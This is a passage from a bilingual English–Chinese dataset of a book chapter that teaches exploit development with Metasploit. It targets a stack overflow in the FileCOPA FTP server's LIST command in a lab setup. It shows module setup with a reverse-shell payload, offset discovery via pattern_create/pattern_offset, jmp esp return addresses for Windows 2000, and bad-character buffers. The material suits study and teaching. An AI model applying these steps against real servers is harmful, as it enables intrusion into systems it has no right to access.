    will stop after the `send_cmd` because *A* (aka `\x41`) doesn't hack anything;
    so no response will be sent to `handler`.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 30秒过后，我们的有效载荷被创建并保存到`buf`中。在这种情况下，有效载荷将是1,000 *A*s。`LIST`命令和`buf`都被发送到目标，然后调用`handler`方法等待目标响应。如果攻击成功，那么`handler`将捕获响应并控制后续操作。当用户完成会话后，调用`disconnect`，这完成了攻击。在这个例子中，模块将在`send_cmd`之后停止，因为*A*（即`\x41`）不会进行任何黑客行为；所以不会向`handler`发送响应。
- en: To test your new MSF module, save this file as *filecopa_exploit.rb*^([[3](#filepos810139)])
    in the folder *\AppData\Local\.msf3\modules*\. Then start the FTP server, OllyDbg,
    and MSF. Attach OllyDbg to the FTP Server on the victim machine. On the attack
    machine, restart the MSF GUI. Within the MSF, click **Exploits**, and search for
    FileCOPA. Find the module shell we just wrote (it will have our description) and
    double-click it. A new window will pop up asking what platform you'd like to target.
    Since we only included one target in the module's code, we only have one choice.
    Click **Forward**. Next, you will select the `generic/shell_reverse_tcp` payload.
    Don't worry about the payload for now; we are only using A—not the actual payload.
    Click **Forward** to proceed. On the following screen, you will be asked to enter
    specific information about the target and yourself. The only information required
    is the `RHOST`, which will be the *remote host*, or victim's IP address. You can
    leave the fields that were already completed as they are unless you know that
    something is different than the default. MSF automatically detects your local
    IP address, assumes FTP is on port 21, and assumes the FTP server permits anonymous
    logins. Click the **Forward** button, review the information, and click **Apply**.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 为了测试您的新MSF模块，请将此文件保存为 *filecopa_exploit.rb*^([[3](#filepos810139)]) 到文件夹 *\AppData\Local\.msf3\modules*
    中。然后启动FTP服务器、OllyDbg和MSF。将OllyDbg附加到受害者机器上的FTP服务器。在攻击机器上，重新启动MSF GUI。在MSF中，点击
    **Exploits**，搜索FileCOPA。找到我们刚刚编写的模块shell（它将包含我们的描述）并双击它。将弹出一个新窗口，询问您想针对哪个平台。由于我们在模块代码中只包含了一个目标，所以我们只有一个选择。点击
    **Forward**。接下来，您将选择 `generic/shell_reverse_tcp` 有效载荷。现在不用担心有效载荷；我们只是使用A——而不是实际的有效载荷。点击
    **Forward** 继续操作。在下一个屏幕上，您将被要求输入有关目标和您自己的具体信息。唯一需要的信息是 `RHOST`，它将是 *远程主机* 或受害者的IP地址。除非您知道某些内容与默认值不同，否则可以保留已完成的字段。MSF自动检测您的本地IP地址，假设FTP在端口21上，并假设FTP服务器允许匿名登录。点击
    **Forward** 按钮，查看信息，并点击 **Apply**。
- en: Remember, we have 30 seconds to attach the debugger to the correct process;
    so right after you hit **Apply**, you'll need to find the child process, `filecpnt`.
    After the process has been attached and MSF continues executing the module, OllyDbg
    should jump up on the victim machine and show the same messages it did before
    (when we manually exploited the FTP server).
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 记住，我们只有30秒的时间将调试器附加到正确的进程；所以您点击 **Apply** 后，需要找到子进程 `filecpnt`。在进程被附加并且MSF继续执行模块后，OllyDbg应该在受害者机器上跳出来并显示与之前（当我们手动利用FTP服务器时）相同的消息。
- en: '* * *'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: '* * *'
- en: ^([[3](#filepos807392)]) If you are using MSF 3.1, you will see *filecopa_list_overflow.rb*.
    This is the same exploit we are writing from scratch, so don't worry about it
    for now.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: ^([[3](#filepos807392)]) 如果您使用的是MSF 3.1，您将看到 *filecopa_list_overflow.rb*。这是我们从头开始编写的相同漏洞利用，所以现在不用担心它。
- en: Finding the Payload Space
  id: totrans-56
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 寻找有效载荷空间
- en: I mentioned that the payload space variable was critical to our exploit. The
    next step in development is to define the payload. To do this, we first need to
    find out how much space is available to play with. The more space we have, the
    more options we get as far as how much capability we can fit into our payloads.
    There are 104 payloads in MSF 3.1, and each payload is a different size. If the
    vulnerable program has limited space for us to use, then some of the larger payloads
    won't work. We also need to know what position on the stack is read as the next
    instruction right before it crashes.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 我提到，有效载荷空间变量对我们漏洞利用至关重要。开发下一步是定义有效载荷。为此，我们首先需要找出有多少空间可供操作。我们拥有的空间越多，我们就有更多的选择，可以决定将多少功能放入我们的有效载荷中。MSF
    3.1中有104个有效载荷，每个有效载荷的大小都不同。如果易受攻击的程序为我们提供了有限的空间，那么一些较大的有效载荷将无法工作。我们还需要知道在崩溃之前，栈上的哪个位置被读取为下一个指令。
- en: During our first two exploit attempts, OllyDbg told us that the next instruction
    pointer's address was `0x41414141` when the FTP server crashed. This address is
    part of our *A* series. To identify which part was loaded into the instruction
    pointer, we need to change the *A* series to a series of characters that are unique
    and non-repeating. We will fill the code with predictable data and see where the
    program crashes. That will show where the address is being read from the stack.
    Basically, we will send the unique data, read where OllyDbg crashed, then search
    our string for the unique, non-repeating data. The final placement will show us
    the buffer size needed to gain control of the application.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们前两次利用尝试中，OllyDbg告诉我们，当FTP服务器崩溃时，下一个指令指针的地址是 `0x41414141`。这个地址是我们 *A* 系列的一部分。为了确定哪一部分被加载到指令指针中，我们需要将
    *A* 系列改为一系列独特且不重复的字符。我们将用可预测的数据填充代码，并查看程序崩溃的位置。这将显示地址是从堆中读取的。基本上，我们将发送独特的数据，读取OllyDbg崩溃的位置，然后在我们的字符串中搜索独特且不重复的数据。最终的放置将显示我们获取应用程序控制所需的缓冲区大小。
- en: 'MSF comes with a great tool called `pattern_create.rb`. You can find it in
    *msf3.tar\msf3\tool*. This Ruby script generates predictable, non-repeating strings—exactly
    what we will use to find the payload space. Because we have used 1,000 as the
    number of characters in our payload, we will use *pattern_create.rb* to generate
    a unique 1,000-character string. The following command will generate the pattern
    and output the results to *payload_test.txt*:'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: MSF附带一个名为 `pattern_create.rb` 的优秀工具。您可以在 *msf3.tar\msf3\tool* 中找到它。这个Ruby脚本生成可预测且不重复的字符串——这正是我们将用来找到有效载荷空间的东西。因为我们已经将1,000用作有效载荷中的字符数，所以我们将使用
    *pattern_create.rb* 生成一个独特的1,000字符字符串。以下命令将生成模式并将结果输出到 *payload_test.txt*：
- en: '``C:\Users\Steve\AppData\Local\msf3\tools>**`ruby pattern_create.rb 1000 >
    payload_test.txt`**``'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: '``C:\Users\Steve\AppData\Local\msf3\tools>**`ruby pattern_create.rb 1000 >
    payload_test.txt`**``'
- en: 'The contents of *payload_test.txt* are shown below:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是 *payload_test.txt* 的内容：
- en: '`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
    Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
    Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7
    Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3
    Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9
    An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5
    Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1
    As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7
    Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3
    Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9
    Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5
    Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1
    Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh`'
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: '`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
    Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
    Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7
    Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3
    Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9
    An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5
    Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1
    As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7
    Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3
    Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9
    Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5
    Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1
    Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh`'
- en: 'We now open the *filecopa_exploit.rb* module and add the string located in
    *payload_test.txt* in place of the `''A''*1000`. The new line will look like this:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们打开 *filecopa_exploit.rb* 模块，并将位于 *payload_test.txt* 中的字符串替换 `'A'*1000`。新行将看起来像这样：
- en: '`buf = ''Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac
    5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af
    1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah
    7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak
    3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am
    9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap
    5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As
    1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au
    7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax
    3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az
    9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc
    5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf
    1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh''`'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: '`buf = ''Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac
    5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af
    1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah
    7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak
    3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am
    9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap
    5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As
    1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au
    7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax
    3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az
    9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc
    5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf
    1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh''`'
- en: Save the updated *filecopa_exploit.rb* and return to the MSF window. To reload
    the edited module, click **System ► Refresh** in the GUI. Reset the applications
    by starting the FTP server and attaching OllyDbg. Run the module as described
    above, and you should see a different error message in OllyDbg. Instead of an
    access violation at `[41414141]`, there will now be an access violation at `[66413366]`
    (see [Figure 10-3](#filepos817346)).
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 保存更新的`filecopa_exploit.rb`文件并返回到MSF窗口。要重新加载编辑后的模块，在GUI中点击**系统 ► 刷新**。通过启动FTP服务器并附加OllyDbg来重置应用程序。按照上述描述运行模块，你应该在OllyDbg中看到不同的错误信息。现在将不再是
    `[41414141]` 的访问违规，而是 `[66413366]` 的访问违规（见[图10-3](#filepos817346)）。
- en: '![OllyDbg attached to FileCOPA showing an access violation](../Images/00019.jpg)'
  id: totrans-66
  prefs: []
  type: TYPE_IMG
  zh: '![OllyDbg附加到FileCOPA显示访问违规](../Images/00019.jpg)'
- en: Figure 10-3. OllyDbg attached to FileCOPA showing an access violation
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 图10-3. OllyDbg附加到FileCOPA显示访问违规
- en: We are making great progress! I hope you're beginning to see how easy MSF makes
    it to develop exploits. Take this new address and prepare to use another great
    MSF tool called *pattern_offset.rb*.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 我们取得了很大的进展！我希望你开始看到MSF如何简化漏洞利用的开发。使用这个新地址并准备使用另一个名为`pattern_offset.rb`的MSF工具。
- en: 'As you may have guessed, this script will be able to tell us exactly how much
    space is used before the vulnerable stack space is called. Type the following
    command, passing the crashed address (`66413366`) and the length of the *payload_test.txt*
    string (`1000`):'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所猜，这个脚本将能够告诉我们调用有漏洞的堆栈空间之前需要占用多少空间。输入以下命令，传递崩溃的地址（`66413366`）和`payload_test.txt`字符串的长度（`1000`）：
- en: '``C:\Program Files\Metasploit\Framework3\framework\tools>**`ruby pattern_offset.rb
    66413366  1000`**``'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: '``C:\Program Files\Metasploit\Framework3\framework\tools>**`ruby pattern_offset.rb
    66413366  1000`**``'
- en: The script responds with how much space needs to be filled before we write an
    address to jump to. In this example, the size of the offset was 160 bytes.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本会响应我们需要在写入跳转地址之前填充多少空间。在这个例子中，偏移量的大小是160字节。
- en: '``C:\Program Files\Metasploit\Framework3\framework\tools>**`ruby pattern_offset.rb
    66413366 1000`** 160``'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: '``C:\Program Files\Metasploit\Framework3\framework\tools>**`ruby pattern_offset.rb
    66413366 1000`** 160``'
- en: We need to provide an address to return or jump to so that we can execute our
    own code. Since `0x41414141` and `0x66413366` won't do anything for our exploit,
    we need to get a different address. I use the online MSF Operation Code (*opcode*)
    database to get an address that allows us to execute our code. This website allows
    the user to search for a specific opcode for any operating system. For this example,
    I went to [http://www.metasploit.com/users/opcode/msfopcode.cgi/](http://www.metasploit.com/users/opcode/msfopcode.cgi/)
    (see [Figure 10-4](#filepos820404)).
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要提供一个返回或跳转的地址，以便我们可以执行自己的代码。由于`0x41414141`和`0x66413366`对我们的漏洞利用没有任何作用，我们需要获取一个不同的地址。我使用在线MSF操作码（*opcode*）数据库来获取一个允许我们执行代码的地址。这个网站允许用户搜索任何操作系统的特定操作码。在这个例子中，我访问了[http://www.metasploit.com/users/opcode/msfopcode.cgi/](http://www.metasploit.com/users/opcode/msfopcode.cgi/)（见[图10-4](#filepos820404)）。
- en: '![Metasploit Online Opcode Database](../Images/00020.jpg)'
  id: totrans-74
  prefs: []
  type: TYPE_IMG
  zh: '![Metasploit 在线操作码数据库](../Images/00020.jpg)'
- en: Figure 10-4. Metasploit Online Opcode Database
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 图10-4. Metasploit 在线操作码数据库
- en: I then clicked **Search for opcodes in a set of modules**.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 我随后点击了**在模块集中搜索操作码**。
- en: I selected the **Specific Opcode** radio button and chose **jmp esp** from the
    drop-down menu.
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 我选择了**特定操作码**单选按钮，并从下拉菜单中选择**jmp esp**。
- en: A list of *.dll*s are shown, and the important thing to remember when choosing
    a *.dll* is that you want it to be as generic, or common across as many platforms,
    as possible. The *uer32.dll* file is pretty generic, so that influenced my decision.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 显示了一个*.dll*列表，选择*.dll*时需要记住的重要一点是，你希望它尽可能通用，或者跨多个平台通用。*uer32.dll*文件相当通用，这影响了我的决定。
- en: I selected my target machine (Windows 2000 Service Pack 4 - English) and clicked
    **Next**.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 我选择了我的目标机器（Windows 2000 Service Pack 4 - 英语）并点击了**下一步**。
- en: The opcode database returned two addresses (`0x77e14c29` and `0x77e3c256`) that
    matched my criteria.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 操作码数据库返回了两个地址（`0x77e14c29`和`0x77e3c256`），它们符合我的标准。
- en: The exploit is almost complete, but we still need to craft the `LIST` command
    and remove all of the bad characters that will frustrate the exploit. Failure
    to remove the bad characters from our payload will result in a failed exploit
    because our payload will be altered by the application.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 漏洞利用几乎完成了，但我们仍然需要构建`LIST`命令并移除所有会阻碍漏洞利用的坏字符。如果未能从我们的有效载荷中移除坏字符，漏洞利用将失败，因为我们的有效载荷将被应用程序修改。
- en: 'To find the bad characters, we need to send all of the hexadecimal characters
    in the ASCII table and determine which ones are modified and corrupted during
    transmission. We modify the payload to contain `int3` (hex value `0xcc`) plus
    `0-255` repeated twice. The repetition of 0 through 255 narrows down what modified
    our character—was it a filter in the application trying to keep bad data out of
    the input buffer, or was it a method that used data as execution commands? Either
    way, we want our data to arrive untouched in the victim application''s input buffer.
    If the character was modified in only one place, then presumably, a method altered
    our data. If two of the same characters are altered, then a filter probably intervened.
    The character string is easily generated using this command (the C argument specifies
    that the `pack` method uses unsigned chars):'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 要找到坏字符，我们需要发送ASCII表中的所有十六进制字符，并确定哪些字符在传输过程中被修改和损坏。我们将有效载荷修改为包含`int3`（十六进制值`0xcc`）加上`0-255`重复两次。0到255的重复缩小了修改我们字符的因素——是应用程序中的过滤器试图将坏数据排除在输入缓冲区之外，还是使用了数据作为执行命令的方法？无论如何，我们都希望我们的数据在受害者应用程序的输入缓冲区中不受损害。如果字符只在一个地方被修改，那么假设有一个方法修改了我们的数据。如果有两个相同的字符被修改，那么过滤器可能介入了。使用此命令可以轻松生成字符字符串（C参数指定`pack`方法使用无符号字符）：
- en: '`buf  = "\xcc" + ([*(1..255)].pack (''C*'') *2)`'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: '`buf  = "\xcc" + ([*(1..255)].pack (''C*'') *2)`'
- en: The following assignment to `buf` would have accomplished the same as the line
    above, but you can see how much smaller the line above is. I prefer the concise
    declarations.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 以下对`buf`的赋值将实现与上面一行相同的效果，但你也可以看到上面一行是多么简洁。我更喜欢简洁的声明。
- en: '`buf = ''\xcc\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\
    x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\ x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\
    x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\ x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\
    x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\ x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\
    x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\ x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\
    xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\ xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\
    xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\ xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\
    xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff...''`'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: '`buf = ''\xcc\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\x89\xaa\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xxf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff...''`'
- en: When viewing the crashed FTP server in OllyDbg, we look for the input supplied
    by our module. The `\xcc` or `int3` is a software interrupt that causes OllyDbg
    to stop as if you had inserted a breakpoint in the code. At this point, we don't
    care about tracing the code; we just want to make sure our payload is solid. The
    interrupt pauses execution, allowing you to observe the characters sent by MSF
    to find which ones, if any, didn't make it through. If any of the characters are
    changed, manipulated, or otherwise different, then we remove them from the list.
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 当在OllyDbg中查看崩溃的FTP服务器时，我们寻找由我们的模块提供的输入。`\xcc`或`int3`是一个软件中断，它会导致OllyDbg停止，就像你在代码中插入了一个断点一样。在这个时候，我们并不关心跟踪代码；我们只想确保我们的有效载荷是稳固的。中断暂停执行，让你能够观察MSF发送的字符，找出哪些字符，如果有的话，没有通过。如果任何字符被更改、操作或以其他方式不同，我们就从列表中移除它们。
- en: You'll know which characters didn't survive because the stream was sequential,
    and there will be one character out of place if anything happened. This process
    is repeated because the stream will only reveal one bad character at a time. You
    have to repeat this process until your steam arrives intact. Once that happens,
    you will have found all of the bad characters. This time-consuming work will ensure
    the encoded payload arrives properly. The bad characters are important when creating
    a NOP sled (no operations that slide into our shellcode) as well as when encoding
    the payload. A *NOP sled* is a segment of code that results in no operations when
    executed. A simple "no operation" command would be `0x90`, which is computer operation
